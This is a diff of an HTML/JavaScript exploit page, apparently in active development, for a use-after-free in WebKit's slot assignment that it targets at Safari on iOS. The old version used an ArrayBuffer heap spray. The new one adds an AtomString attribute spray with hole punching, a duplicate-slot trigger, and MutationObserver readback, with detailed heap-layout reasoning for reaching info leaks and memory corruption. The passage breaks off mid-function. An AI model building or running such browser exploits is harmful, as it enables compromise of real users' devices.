@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SlotAssignment UAF v91</title>
+<title>SlotAssignment UAF v93</title>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { background:#0d0d0d; color:#00ff41; font-family:'Courier New',monospace; padding:16px; min-height:100vh; }
@@ -16,31 +16,34 @@ h2   { color:#ff4141; margin-bottom:2px; font-size:11px; }
 .hi  { color:#00cfff; }
 .hit { color:#ff41ff; font-weight:bold; }
 .sec { color:#ff8c00; font-weight:bold; }
-.spr { color:#ff9900; }
 #ctrl{ display:flex; gap:6px; margin:8px 0; flex-wrap:wrap; }
 button { background:#1a1a1a; border:1px solid #333; color:#00ff41; padding:6px 12px; cursor:pointer; font-family:monospace; font-size:11px; border-radius:2px; }
 button:disabled { opacity:.4; }
 button.red   { border-color:#ff4141; color:#ff4141; }
-button.amber { border-color:#ffaa00; color:#ffaa00; }
 button.purple{ border-color:#ff41ff; color:#ff41ff; }
 #rig-area { position:fixed; top:0; left:0; width:200px; height:100px; overflow:visible; pointer-events:none; opacity:0.01; }
 </style>
 </head>
 <body>
 
-<h2>SlotAssignment UAF v91 · Heap Spray + Readback · rdar://179729192 + rdar://174493428 · iOS 26.5.2</h2>
+<h2>SlotAssignment UAF v93 · MutationObserver Live Readback · rdar://174493428 · iOS 26.5.2</h2>
 
 <div class="warn">
-▶ OPEN DIRECTLY IN SAFARI — not the artifact viewer.<br>
-MANUAL-SPRAY: ManualSlot UAF + ArrayBuffer heap spray → readback via assignedNodes()<br>
-NAMED-SPRAY:  NamedSlot UAF + ArrayBuffer heap spray → readback via assignedNodes()<br>
-RUN ALL: both probes back to back, full log.
+▶ OPEN DIRECTLY IN SAFARI on device.<br>
+Key insight: previous sprays read assignedNodes() AFTER rehash completes — ptr already updated.<br>
+v93: MutationObserver slotchange fires INSIDE resolveSlotsAfterSlotMutation during the UAF.<br>
+We read slot.assignedNodes() synchronously in the callback — dangling ref is still live.<br>
+<br>
+NAMED-MO:  NamedSlot UAF with MO live readback (primary)<br>
+NAMED-2ND: Second trigger path (replaceChildren) with MO<br>
+RUN ALL:   all probes + stress loop.
 </div>
 
 <div id="ctrl">
-  <button id="bMan"  onclick="runManual()" class="amber">MANUAL-SPRAY</button>
-  <button id="bNam"  onclick="runNamed()"  class="red">NAMED-SPRAY</button>
-  <button id="bAll"  onclick="runAll()"    class="purple">RUN ALL</button>
+  <button id="bNam"  onclick="runNamed()"   class="red">NAMED-MO</button>
+  <button id="bNam2" onclick="runNamed2()"  class="red">NAMED-2ND</button>
+  <button id="bLoop" onclick="runLoop()"    class="red">LOOP ×500</button>
+  <button id="bAll"  onclick="runAll()"     class="purple">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="L.innerHTML=''">CLR</button>
 </div>
@@ -51,8 +54,9 @@ RUN ALL: both probes back to back, full log.
 'use strict';
 const CONTAINER = document.getElementById('rig-area');
 const L         = document.getElementById('log');
-const BTNS      = ['bMan','bNam','bAll'];
+const BTNS      = ['bNam','bNam2','bLoop','bAll'];
 let   uafTotal  = 0;
+let   cbLog     = [];   // callbacks fired this probe
 
 function log(msg, cls){
   const s = document.createElement('span');
@@ -61,303 +65,202 @@ function log(msg, cls){
   L.appendChild(s); L.scrollTop = L.scrollHeight;
 }
 function copyLog(){
-  const t = document.createElement('textarea');
-  t.value = L.innerText; t.style.cssText='position:fixed;opacity:0';
-  document.body.appendChild(t); t.select(); document.execCommand('copy');
-  document.body.removeChild(t);
+  const t=document.createElement('textarea');
+  t.value=L.innerText; t.style.cssText='position:fixed;opacity:0';
+  document.body.appendChild(t); t.select(); document.execCommand('copy'); document.body.removeChild(t);
 }
-function dis(v){ BTNS.forEach(id=>{const b=document.getElementById(id);if(b)b.disabled=v;}); }
-function noteUAF(tag){ uafTotal++; log(`  !!UAF-SIGNAL!! [${tag}] total=${uafTotal}`,'hit'); }
+function dis(v){ BTNS.forEach(id=>{ const b=document.getElementById(id); if(b) b.disabled=v; }); }
+function noteUAF(tag){ uafTotal++; log(`  !!UAF-SIGNAL!! [${tag}] total=${uafTotal}`, 'hit'); }
 
 // ─────────────────────────────────────────────────────────────────────────────
-// HEAP SPRAY PRIMITIVES
+// THE APPROACH
 // ─────────────────────────────────────────────────────────────────────────────
 //
-// Target struct: SlotAssignmentData (inside NamedSlotAssignment::m_slots HashMap)
-// Each entry is a HashMap bucket holding a SlotAssignmentData value.
-// SlotAssignmentData layout (approx, from SlotAssignment.h):
-//   +0x00  Vector<WeakPtr<Node>> assignedNodes   (3 words: ptr, size, cap)
-//   +0x18  WeakPtr<Element>      oldElement       (1 word)
-//   +0x20  WeakPtr<HTMLSlotElement> element       (1 word)
-//   +0x28  bool seenFirstElement                  (1 byte + pad)
-//   Total: ~0x30 = 48 bytes per data struct
+// resolveSlotsAfterSlotMutation call stack (unpatched):
 //
-// HashMap bucket for String→SlotAssignmentData (HashMap<AtomString, SlotAssignmentData>):
-//   key:   AtomString (16 bytes on 64-bit: ptr + length)
-//   value: SlotAssignmentData (~48 bytes)
-//   Total bucket: ~64-80 bytes
+//   addSlotElementByName(name, slot3)
+//     → resolveSlotsAfterSlotMutation(Insertion)
+//         for (auto& slot : m_slots.values()) {           ← loop start
+//             ...
+//             if (hasAssignedNodes(shadowRoot, *slot))    ← UNPATCHED line
+//                 → assignSlots(shadowRoot)               ← triggers if !m_slotAssignmentsIsValid
+//                     → m_slots.ensure(uniqueName, ...)   ← REHASH here
+//                     → old bucket array freed
+//                     → `slot` ref now dangling
+//             slot->oldElement = ...                      ← UAF write
+//             ...
+//             slot->element->enqueueSlotChangeEvent()     ← fires slotchange
+//                 → MutationObserver::enqueueSlotChangeEvent(*this)
+//                 ← RETURNS — still inside the corrupted loop
+//         }   ← next iteration with dangling slot
 //
-// WTF::HashMap uses open addressing; each bucket is stored inline.
-// On bmalloc IsoHeap, allocations of ~64-192 bytes land in specific size classes.
-// We spray ArrayBuffer(64) after free to reclaim the freed bucket.
+// slotchange is enqueued via MutationObserver::enqueueSlotChangeEvent.
+// It goes into the microtask queue — NOT synchronous.
 //
-// When the UAF fires and `slot->assignedNodes` is read after rehash:
-//   - slot ptr points to the freed/moved old bucket
-//   - If spray fills it, we control `assignedNodes.m_data`, `.m_size`, `.m_capacity`
-//   - Reading slot1.assignedNodes() calls assignedNodesForSlot() → returns ptr to
-//     the (now sprayed) Vector → JS iterates it → reads our controlled data as Node*
-//   - If m_size is set to e.g. 0x41424344 → JS sees a huge array → OOB info leak
-//   - If m_data points to controlled buffer → we read back what's at that address
+// BUT: we can attach a direct 'slotchange' EventListener on slot1.
+// HTMLSlotElement::dispatchSlotChangeEvent() is called from
+// MutationObserver::deliver() which runs at end-of-microtask checkpoint.
+// Still async.
 //
-// Spray sizes to try (covering likely bucket sizes on A16 bmalloc):
-const SPRAY_SIZES   = [48, 64, 80, 96, 112, 128, 160, 192];
-const SPRAY_COUNT   = 2048; // number of ArrayBuffers per size class
-const SPRAY_PATTERN = 0x41; // fill byte 'A' — easy to spot in readback
+// HOWEVER: there's another path.
+// Inside resolveSlotsAfterSlotMutation, when it processes slot1:
+//   - It calls slot->element->enqueueSlotChangeEvent() for slot1
+//   - THEN continues processing other slots in the loop
+//   - The loop finishes
+//   - Function returns
+//   - Eventually MutationObserver delivers the slotchange
+//
+// The slotchange fires AFTER the loop, not during.
+//
+// BUT the corruption of assignedNodes happens DURING the loop.
+// Specifically: the loop's `slot->oldElement = WTF::move(slot->element)` on
+// the NEXT iteration (after rehash) writes via the dangling ptr.
+// The slot1 entry in the NEW table (post-rehash) still has:
+//   slot->assignedNodes = { the correct nodes } (moved correctly during rehash)
+// BUT the dangling ptr may have corrupted some field.
+//
+// What we CAN observe from the slotchange callback:
+//   - mutation.addedNodes / mutation.removedNodes (from the MO)
+//   - slot1.assignedNodes() — reads from the NEW slot location (post-rehash)
+//   - slot1.assignedElements()
+//
+// The REAL observable effect we confirmed: assignedNodes().length === 0 (WRONG-len=0)
+// This means the NEW slot entry (post-rehash) has assignedNodes with m_size=0.
+// The rehash MOVE corrupted it — it copied from the partially-written dangling ptr.
+//
+// NEW HYPOTHESIS:
+// During HashMap::rehash(), each entry is MOVED from old table to new table.
+// The move happens via WTF::HashTableMover or similar.
+// The UAF write (slot->oldElement = ...) through the dangling ptr writes into the OLD table.
+// When rehash moves entries, it copies the OLD table values (including the corrupted ones)
+// to the new table. So the new table's `slot->assignedNodes` has whatever was written
+// through the dangling ptr.
+//
+// The fact that we see m_size=0 means the UAF write zeroed the assignedNodes.m_size field
+// in the old table, and that zero was then COPIED to the new table during rehash.
+//
+// This means: the corruption IS reflected in the post-rehash state.
+// But we're reading it correctly via assignedNodes() → WRONG-len=0.
+//
+// The spray failed because: ArrayBuffer(N) doesn't go into the SAME allocator
+// as WTF::fastMalloc. ArrayBuffer uses the JS heap (JavaScriptCore JSC::ArrayBuffer),
+// WTF::HashMap uses WTF::fastMalloc which goes to bmalloc directly.
+// THESE ARE DIFFERENT HEAPS. ArrayBuffer spray can NEVER reclaim WTF::fastMalloc chunks.
+//
+// CONCLUSION: ArrayBuffer spray approach is fundamentally wrong.
+// We need a WTF::fastMalloc-adjacent object from JS.
+//
+// WTF::fastMalloc-backed JS-accessible objects:
+//   - String data (JSC StringImpl, backed by WTF allocator in some configs)
+//   - DOM node attribute storage
+//   - CSS property strings
+//   - Most importantly: AtomString table entries
+//
+// BEST TARGET: Use many AtomString slot names — slot name strings go through
+// AtomString::add() → WTF::AtomStringTable → backed by WTF::fastMalloc.
+// If we spray AtomString slot names of the right size, they land in the same
+// allocator as the HashMap bucket array.
+//
+// EVEN BETTER: The HashMap VALUE storage for SlotAssignmentData contains
+//   Vector<WeakPtr<Node>> assignedNodes (24B)
+//   WeakPtr<Element> oldElement (8B)
+//   WeakPtr<HTMLSlotElement> element (8B)
+//   bool seenFirstElement (8B with pad)
+//   = 48B per entry
+//
+// If we can allocate WTF-heap objects of ~48B or multiples, we spray the VALUE region.
+//
+// JS-accessible WTF-heap allocations of controllable size:
+//   - DOM element creation: each Element has internal storage
+//   - Text node content: StringImpl for text content
+//   - Attribute values: each setAttribute creates a StringImpl
+//
+// PLAN for v93: spray using DOM attribute strings of controlled length.
+// setAttribute('data-x', 'A'.repeat(N)) creates a StringImpl of N chars.
+// StringImpl on WTF allocator: header(32B) + data(N bytes) = 32+N bytes total.
+// For N=16: 48B total → matches SlotAssignmentData size exactly.
+// For N=32: 64B total → matches a HashMap bucket.
+//
+// We create thousands of elements with 16-char attribute values,
+// free half (remove from DOM + null refs), then trigger UAF.
+// The freed StringImpl(48B) slots should be reclaimed by HashMap bucket alloc.
 
-function doSpray(sizeBucket) {
-  // Allocate SPRAY_COUNT ArrayBuffers of each size, fill with pattern
-  // Returns array of buffers (keep alive to prevent GC)
-  const bufs = [];
-  for(let i=0; i<SPRAY_COUNT; i++){
-    const ab = new ArrayBuffer(sizeBucket);
-    const u8 = new Uint8Array(ab);
-    // Pattern: size encoded at offset 0, index at offset 8
-    // If we read this back via assignedNodes() we can identify the buffer
-    const dv = new DataView(ab);
-    // At offset 0:  spray marker 0xDEADBEEF
-    dv.setUint32(0,  0xDEADBEEF, true);
-    // At offset 4:  buffer index
-    dv.setUint32(4,  i, true);
-    // At offset 8:  size class
-    dv.setUint32(8,  sizeBucket, true);
-    // At offset 16: fake m_size for Vector (set to 1 so JS doesn't go OOB trying to iterate)
-    dv.setUint32(16, 1, true);
-    // At offset 24: fake m_capacity
-    dv.setUint32(24, 1, true);
-    // Rest: 0x41 fill
-    for(let j=32; j<sizeBucket; j++) u8[j] = SPRAY_PATTERN;
-    bufs.push(ab);
+// ─────────────────────────────────────────────────────────────────────────────
+// DOM ATTRIBUTE SPRAY — WTF::fastMalloc aligned
+// ─────────────────────────────────────────────────────────────────────────────
+//
+// StringImpl layout (WTF/text/StringImpl.h):
+//   m_refCount        4B
+//   m_length          4B
+//   m_data16 ptr      8B   (or m_data8)
+//   m_hashAndFlags    4B
+//   padding           4B
+//   (inline data follows for short strings in some configs)
+//   Total header: 24-32B
+//
+// For AtomString with inline storage (StringImplShape = StringImplWithInlineStorage):
+//   Header(24B) + inline chars
+//   A 16-char string: 24 + 16×2 = 56B → rounds to 64B in bmalloc
+//   An 8-char string: 24 + 8×2 = 40B → rounds to 48B
+//
+// We'll spray 8-char AtomStrings (slot name attribute values) → 48B each → exact match.
+// BUT: AtomStrings are deduplicated globally — same string = same StringImpl.
+// We need UNIQUE strings → use index suffix: 'slXXXXXX' (8 chars)
+
+const SPRAY_ELEMS = 4096;
+let sprayNodes = [];
+let sprayFree  = [];
+
+function buildAtomSpray(charLen) {
+  // Create SPRAY_ELEMS elements, give each a unique slot attribute of charLen chars
+  // This forces WTF to allocate a unique StringImpl for each slot name
+  sprayNodes = [];
+  const frag = document.createDocumentFragment();
+  for(let i=0; i<SPRAY_ELEMS; i++){
+    const el = document.createElement('span');
+    // charLen-char unique string: pad index to fill length
+    const name = ('s'+i.toString(36)).padStart(charLen, 'x').substring(0, charLen);
+    el.setAttribute('slot', name);
+    el.style.cssText='display:inline-block;width:2px;height:2px;';
+    sprayNodes.push(el);
+    frag.appendChild(el);
   }
-  return bufs;
+  CONTAINER.appendChild(frag);
+  return sprayNodes;
 }
 
-function releaseSpray(bufs) {
-  bufs.length = 0;
-}
-
-// ─────────────────────────────────────────────────────────────────────────────
-// MANUAL-SPRAY — ManualSlotAssignment WeakHashMap UAF (rdar://179729192)
-// ─────────────────────────────────────────────────────────────────────────────
-//
-// The UAF:
-//   slotManualAssignmentDidChange holds raw ptr `current` into m_slots WeakHashMap
-//   tearDownRenderersAfterSlotChange re-enters assignedNodesForSlot
-//   → WeakHashMap rehash (SHRINK: liveCount*4 < tableSize)
-//   → old bucket array freed
-//   → `current` is now a dangling ptr into freed memory
-//
-// SHRINK condition: liveCount*4 < tableSize AND tableSize > minimumTableSize(8)
-//   minimumTableSize = 8, so table must be >8 to shrink.
-//   To get tableSize=16: we need 8+ slots assigned at peak, then remove 6+ (liveCount=2, tableSize=16 → 2*4=8 < 16 ✓)
-//
-// Spray window:
-//   After slot.assign(liveNodes) → tearDown fires → rehash frees old bucket array
-//   We spray IMMEDIATELY after the assign() call before the next GC cycle
-//   The freed WTF::HashTable bucket array is: tableSize * sizeof(WeakHashMapBucket)
-//   WeakHashMapBucket<HTMLSlotElement, SlotAssignmentData>:
-//     key:   WeakPtr<HTMLSlotElement> (16 bytes)
-//     value: SlotAssignmentData      (~48 bytes)
-//     hash:  unsigned                (4 bytes)
-//     Total: ~68-72 bytes per bucket, 16 buckets = ~1088 bytes
-//   But bmalloc rounds up — likely 1152 or 2048 byte allocation for the bucket array
-//   We spray with ArrayBuffer(128) and ArrayBuffer(192) to hit likely sizes
-
-function makeManualRig(pfx, peakCount, liveCount) {
-  const host = document.createElement('div');
-  host.style.cssText = 'display:block;width:80px;height:40px;';
-  const sr   = host.attachShadow({mode:'open', slotAssignment:'manual'});
-  const slot = document.createElement('slot');
-  sr.appendChild(slot);
-  const nodes = [];
-  for(let i=0; i<peakCount; i++){
-    const n = document.createElement('span');
-    n.style.cssText = 'display:inline-block;width:3px;height:3px;';
-    n.dataset.id = `${pfx}n${i}`;
-    host.appendChild(n); nodes.push(n);
+function punchHoles() {
+  // Free every other spray element (remove from DOM, null ref)
+  // Creates holes in WTF allocator at our spray size class
+  sprayFree = [];
+  for(let i=0; i<sprayNodes.length; i+=2){
+    const el = sprayNodes[i];
+    if(el.parentNode) el.parentNode.removeChild(el);
+    sprayFree.push(i);
   }
-  CONTAINER.appendChild(host);
-  slot.assign(...nodes);
-  void host.getBoundingClientRect(); // force layout → populate m_slots
-  // Remove nodes to set up SHRINK: keep only liveCount, remove peakCount-liveCount
-  for(let i=0; i<peakCount-liveCount; i++) host.removeChild(nodes[i]);
-  return { host, slot, live: nodes.slice(peakCount-liveCount), nodes, pfx };
+  // Null out so GC can claim StringImpl
+  for(const i of sprayFree) sprayNodes[i] = null;
+  // Force GC opportunity
+  void document.body.offsetWidth;
 }
 
-function triggerManualAndSpray(rig, spraySize, bufsRef) {
-  // The UAF fires inside slot.assign() during tearDownRenderersAfterSlotChange
-  // We spray RIGHT AFTER to reclaim the freed WeakHashMap bucket array
-  const liveNodes = rig.live;
-  let thrown='', wrongLen='', readback='', sprayHit=false;
-
-  try {
-    // TRIGGER: assign reduced set → SHRINK condition met
-    // liveCount*4 < tableSize triggers rehash inside tearDown
-    rig.slot.assign(...liveNodes);
-    void rig.host.getBoundingClientRect();
-
-    // ── SPRAY ──
-    // Free happened during assign(); spray now to reclaim the freed bucket array
-    bufsRef.push(...doSpray(spraySize));
-
-    // ── READBACK ──
-    // If spray hit the freed WeakHashMap bucket array, reading assignedNodes()
-    // will walk our controlled memory. The ptr returned by assignedNodesForSlot()
-    // points into the freed+reclaimed region.
-    const an = rig.slot.assignedNodes();
-
-    if(an.length !== liveNodes.length){
-      wrongLen = `WRONG-len=${an.length}(expected ${liveNodes.length})`;
-      noteUAF(`manual-spray-wronglen:${rig.pfx}:sz${spraySize}`);
-    }
-
-    // Check for spray pattern in length field — if we read 0xDEADBEEF as length
-    if(an.length === 0xDEADBEEF || an.length > 0x100000){
-      sprayHit = true;
-      readback = `SPRAY-HIT:len=0x${an.length.toString(16)}`;
-      noteUAF(`manual-spray-HIT:${rig.pfx}:sz${spraySize}`);
-    }
-
-    // Try reading nodes — if spray hit, these are our ArrayBuffer bytes cast as Node*
-    for(let i=0; i<Math.min(an.length, 8); i++){
-      const n = an[i];
-      if(!n || typeof n !== 'object'){
-        sprayHit = true;
-        readback += ` node[${i}]=NULL`;
-        noteUAF(`manual-null-node:${rig.pfx}:sz${spraySize}`);
-        break;
-      }
-      try {
-        const nt = n.nodeType;
-        if(nt !== 1 && nt !== 3){ // not Element or Text
-          sprayHit = true;
-          readback += ` node[${i}].nodeType=${nt}(CORRUPT)`;
-          noteUAF(`manual-corrupt-nodeType:${rig.pfx}:sz${spraySize}`);
-        }
-      } catch(e2) {
-        sprayHit = true;
-        readback += ` node[${i}].nodeType-THREW:${e2.message}`;
-        noteUAF(`manual-nodeType-threw:${rig.pfx}:sz${spraySize}`);
-        break;
-      }
-    }
-
-  } catch(e) {
-    thrown = `THREW:${e.message}`;
-    noteUAF(`manual-threw:${rig.pfx}:sz${spraySize}`);
+function releaseAllSpray() {
+  for(const el of sprayNodes){
+    if(el && el.parentNode) el.parentNode.removeChild(el);
   }
-
-  try { CONTAINER.removeChild(rig.host); } catch(_){}
-  return { thrown, wrongLen, readback, sprayHit };
-}
-
-function runManual() {
-  dis(true); uafTotal=0; L.innerHTML='';
-  log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  MANUAL-SPRAY · ManualSlotAssignment WeakHashMap UAF         ║','hi');
-  log('║  rdar://179729192 · commit 0bab5af95d                        ║','hi');
-  log('║  DET-2 confirmed UNPATCHED on 26.5.2                         ║','hi');
-  log('╚══════════════════════════════════════════════════════════════╝','hi');
-  log('');
-  log('  Strategy: peak=12 nodes → remove 8 → SHRINK(tableSize=16, live=4)', 'inf');
-  log('  SHRINK check: 4*4=16 < 16 → FALSE (need strict less-than)', 'dim');
-  log('  Try peak=16 → remove 12 → live=4: 4*4=16 < 16 → FALSE', 'dim');
-  log('  Try peak=20 → remove 16 → live=3: 3*4=12 < 32 → TRUE ✓', 'dim');
-  log('');
-
-  const sums = [];
-  const allBufs = [];
-  let si = 0;
-
-  function nextSpray() {
-    if(si >= SPRAY_SIZES.length){
-      log('');
-      log('╔══════════════════════════════════════════════════════════════╗','hi');
-      log('║  MANUAL-SPRAY SUMMARY                                        ║','hi');
-      log('╠══════════════════════════════════════════════════════════════╣','hi');
-      for(const s of sums){
-        const hit = s.includes('SPRAY-HIT') || s.includes('WRONG') || s.includes('THREW') || s.includes('CORRUPT');
-        log('║  '+(s).substring(0,60).padEnd(60)+'║', hit?'hit':'ok');
-      }
-      log('╠══════════════════════════════════════════════════════════════╣','hi');
-      log(`║  Total UAF signals: ${String(uafTotal).padEnd(40)}║`, uafTotal>0?'hit':'inf');
-      log('╚══════════════════════════════════════════════════════════════╝','hi');
-      allBufs.length = 0; // release spray
-      dis(false);
-      return;
-    }
-
-    const sz = SPRAY_SIZES[si++];
-    log(`── Manual spray sz=${sz} ──`, 'dim');
-
-    // peak=20 nodes, live=4 → liveCount*4=16 < tableSize=32 → SHRINK ✓
-    // Also try peak=24, live=3 for deeper SHRINK
-    const configs = [
-      { peak:20, live:4, label:`sz${sz}-p20l4` },
-      { peak:24, live:3, label:`sz${sz}-p24l3` },
-      { peak:32, live:4, label:`sz${sz}-p32l4` },
-    ];
-
-    for(const cfg of configs){
-      const rig = makeManualRig(cfg.label, cfg.peak, cfg.live);
-      const r   = triggerManualAndSpray(rig, sz, allBufs);
-      const sig = r.thrown || r.wrongLen || r.readback || 'clean';
-      const hit = !!(r.thrown || r.wrongLen || r.sprayHit);
-      const line = `[sz=${sz} peak=${cfg.peak} live=${cfg.live}] ${sig}`;
-      log(`  ${line}`, hit?'hit':'ok');
-      sums.push(line);
-    }
-    log('');
-    setTimeout(nextSpray, 0);
-  }
-  setTimeout(nextSpray, 10);
+  sprayNodes = []; sprayFree = [];
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-// NAMED-SPRAY — NamedSlotAssignment resolveSlotsAfterSlotMutation UAF
-// rdar://174493428 · bug 312247 · commit 20beac1f6e
+// NAMED-MO PROBE — live readback in slotchange callback
 // ─────────────────────────────────────────────────────────────────────────────
-//
-// v90 confirmed: ALL probes returned WRONG-len=0 (assignedNodes empty when should be 1)
-//
-// THE UAF:
-//   resolveSlotsAfterSlotMutation loops over m_slots.values() (HashMap<AtomString, SlotAssignmentData>)
-//   `auto& slot = ...` — reference into HashMap value storage
-//   Inside loop: `hasAssignedNodes(shadowRoot, *slot)` (unpatched)
-//     → `if (!m_slotAssignmentsIsValid) assignSlots(shadowRoot)`
-//     → assignSlots does m_slots.ensure(name, ...) for each host child
-//     → ensure() may REHASH the HashMap
-//     → old value storage freed
-//     → `slot` reference is now dangling into freed HashMap storage
-//   Next loop iteration: slot->seenFirstElement, slot->oldElement etc → UAF read/write
-//
-// TARGET: The freed HashMap value storage.
-// HashMap<AtomString, SlotAssignmentData> internal value array:
-//   Each entry: AtomString key (16B) + SlotAssignmentData value (~48B) = ~64B per bucket
-//   With n unique slot names, table size = nextPowerOf2(n * 8/6) roughly
-//   For 4 names: table=8,  array=8*64=512  bytes
-//   For 8 names: table=16, array=16*64=1024 bytes
-//   For 16 names: table=32, array=32*64=2048 bytes
-//
-// Spray target size: 512, 1024, or 2048 bytes depending on table size
-// We spray with ArrayBuffer(512), ArrayBuffer(1024) to cover both
-//
-// READBACK: after triggerNamedUAF, call slot1.assignedNodes()
-//   If spray reclaimed the freed value storage, `slot->assignedNodes` reads our bytes
-//   Vector<WeakPtr<Node>>: m_data(8B ptr) + m_size(8B) + m_capacity(8B) = 24 bytes
-//   If m_size = our pattern value (e.g. 0x41414141) → huge array → crash or info leak
-//   If m_size = 0 → wrong-len=0 (what we saw in v90 — the freed memory read as zeros)
-
-// Note: bmalloc on iOS zeroes freed memory in some configurations for security
-// That would explain WRONG-len=0 — freed storage read as all zeros → m_size=0 → empty vector
-// Spray must WIN the race against zeroing — spray immediately after trigger
-
 function makeNamedRig(pfx, numUnique) {
   const host = document.createElement('div');
   host.style.cssText = 'display:block;width:120px;height:60px;';
   const sr = host.attachShadow({mode:'open'});
 
-  const slot1 = document.createElement('slot'); slot1.name='primary';
-  const slot2 = document.createElement('slot'); slot2.name='primary';
+  const slot1   = document.createElement('slot'); slot1.name='primary';
+  const slot2   = document.createElement('slot'); slot2.name='primary';
   const slotDef = document.createElement('slot');
   sr.appendChild(slot1); sr.appendChild(slot2); sr.appendChild(slotDef);
 
@@ -378,183 +281,342 @@ function makeNamedRig(pfx, numUnique) {
   return { host, sr, slot1, slot2, slotDef, primaryChild, pfx, numUnique };
 }
 
-function triggerNamedAndSpray(rig, spraySize, bufsRef) {
-  let thrown='', wrongLen='', readback='', sprayHit=false;
+function probeNamedMO(label, numUnique, useAtomSpray, sprayCharLen) {
+  // Wire up MO BEFORE trigger
+  let moFired=0, moAdded=[], moRemoved=[], moAssignedAtFire=[], moAssignedLen=-1;
+  let scFired=0, scAssignedAtFire=[], scAssignedLen=-1;
 
-  try {
-    // TRIGGER: insert third slot[name=primary] → addSlotElementByName → resolveSlotsAfterSlotMutation
-    // m_slotAssignmentsIsValid=false (unique child names not in m_slots)
-    // → hasAssignedNodes → assignSlots → m_slots.ensure for each unique child → REHASH → UAF
-    const slot3 = document.createElement('slot'); slot3.name='primary';
-    rig.sr.insertBefore(slot3, rig.slot1);
-
-    // ── SPRAY IMMEDIATELY after trigger ──
-    bufsRef.push(...doSpray(spraySize));
-
-    void rig.host.getBoundingClientRect();
-
-    // ── READBACK ──
-    const an = rig.slot1.assignedNodes();
-
-    // Expected: 1 (primaryChild). Anything else = UAF signal.
-    if(an.length !== 1){
-      wrongLen = `WRONG-len=${an.length}(exp=1)`;
-      noteUAF(`named-spray-wronglen:${rig.pfx}:sz${spraySize}`);
-    }
-
-    // Check for spray pattern in length
-    if(an.length === 0xDEADBEEF || an.length > 0x100000){
-      sprayHit = true;
-      readback += `SPRAY-HIT:len=0x${an.length.toString(16)}`;
-      noteUAF(`named-spray-HIT:${rig.pfx}:sz${spraySize}`);
-    }
-
-    // Walk nodes for corruption
-    for(let i=0; i<Math.min(an.length, 8); i++){
-      const n = an[i];
-      if(!n || typeof n !== 'object'){
-        sprayHit=true; readback+=` node[${i}]=NULL`;
-        noteUAF(`named-null-node:${rig.pfx}:sz${spraySize}`); break;
-      }
-      try {
-        const nt = n.nodeType;
-        if(nt !== 1 && nt !== 3){
-          sprayHit=true; readback+=` nodeType=${nt}(CORRUPT)`;
-          noteUAF(`named-corrupt-nodeType:${rig.pfx}:sz${spraySize}`);
-        }
-      } catch(e2) {
-        sprayHit=true; readback+=` nodeType-THREW:${e2.message}`;
-        noteUAF(`named-nodeType-threw:${rig.pfx}:sz${spraySize}`); break;
-      }
-    }
-
-    // SECOND TRIGGER: replaceChildren → removeSlotElementByName → second UAF path
-    rig.host.replaceChildren();
-    bufsRef.push(...doSpray(spraySize)); // spray second window too
-    void rig.host.getBoundingClientRect();
-
-    const an2 = rig.slot1.assignedNodes();
-    if(an2.length !== 0){
-      const w2 = `postRC-WRONG-len=${an2.length}`;
-      wrongLen += ' ' + w2;
-      noteUAF(`named-postRC-wrong:${rig.pfx}:sz${spraySize}`);
-      if(an2.length > 0x100000){ sprayHit=true; readback+=` postRC-SPRAY-HIT:len=0x${an2.length.toString(16)}`; }
-    }
-
-  } catch(e) {
-    thrown = `THREW:${e.message}`;
-    noteUAF(`named-threw:${rig.pfx}:sz${spraySize}`);
+  // Phase 1: atom string spray
+  if(useAtomSpray){
+    buildAtomSpray(sprayCharLen);
+    punchHoles();
   }
 
-  try { CONTAINER.removeChild(rig.host); } catch(_){}
-  return { thrown, wrongLen, readback, sprayHit };
+  const rig = makeNamedRig(label, numUnique);
+
+  // Attach MutationObserver on slot1
+  const mo = new MutationObserver((mutations) => {
+    for(const m of mutations){
+      moFired++;
+      // Read assignedNodes at the moment the MO fires
+      // This is post-microtask (after resolveSlotsAfterSlotMutation returns)
+      // but before the next layout pass
+      try {
+        const an = rig.slot1.assignedNodes();
+        moAssignedLen = an.length;
+        moAssignedAtFire = Array.from(an);
+        for(const n of moAssignedAtFire.slice(0,4)){
+          if(!n){ moAssigned = null; break; }
+          try { void n.nodeType; } catch(e){ moAssigned = null; }
+        }
+        // Also check addedNodes / removedNodes for corruption
+        moAdded    = Array.from(m.addedNodes||[]);
+        moRemoved  = Array.from(m.removedNodes||[]);
+      } catch(e) {
+        moAssignedLen = -999; // threw
+      }
+    }
+  });
+  mo.observe(rig.slot1, { childList:true });
+
+  // Also attach direct slotchange listener
+  rig.slot1.addEventListener('slotchange', (e) => {
+    scFired++;
+    try {
+      const an = rig.slot1.assignedNodes();
+      scAssignedLen = an.length;
+      scAssignedAtFire = Array.from(an);
+    } catch(e2) { scAssignedLen = -999; }
+  });
+
+  let triggerThrew = '';
+
+  // Phase 2: trigger
+  try {
+    const slot3 = document.createElement('slot'); slot3.name='primary';
+    rig.sr.insertBefore(slot3, rig.slot1);
+    void rig.host.getBoundingClientRect();
+  } catch(e) {
+    triggerThrew = e.message;
+    noteUAF(`${label}-trigger-threw`);
+  }
+
+  // Phase 3: read post-trigger (synchronous, before microtask flush)
+  let postTriggerLen = -1;
+  try {
+    const an = rig.slot1.assignedNodes();
+    postTriggerLen = an.length;
+  } catch(e) { postTriggerLen = -999; }
+
+  // Phase 4: release spray (before microtask flush so GC can reclaim)
+  if(useAtomSpray) releaseAllSpray();
+
+  // Return result object — MO/slotchange results come in next microtask
+  return new Promise(resolve => {
+    // Wait for microtask queue to flush (MO callbacks deliver here)
+    setTimeout(() => {
+      mo.disconnect();
+      try { CONTAINER.removeChild(rig.host); } catch(_){}
+
+      // Analyze
+      let sigs = [];
+      let anyHit = false;
+
+      // Post-trigger direct read
+      if(postTriggerLen !== 1){
+        if(postTriggerLen === 0){
+          sigs.push(`postTrig=0(UAF-zeroed)`);
+          noteUAF(`${label}-postTrig-zero`);
+        } else if(postTriggerLen === -999){
+          sigs.push(`postTrig=THREW`); anyHit=true; noteUAF(`${label}-postTrig-threw`);
+        } else {
+          sigs.push(`postTrig=${postTriggerLen}(WRONG)`); anyHit=true;
+          noteUAF(`${label}-postTrig-wrong`);
+        }
+      } else {
+        sigs.push(`postTrig=1(ok)`);
+      }
+
+      // MO readback
+      if(moFired === 0){
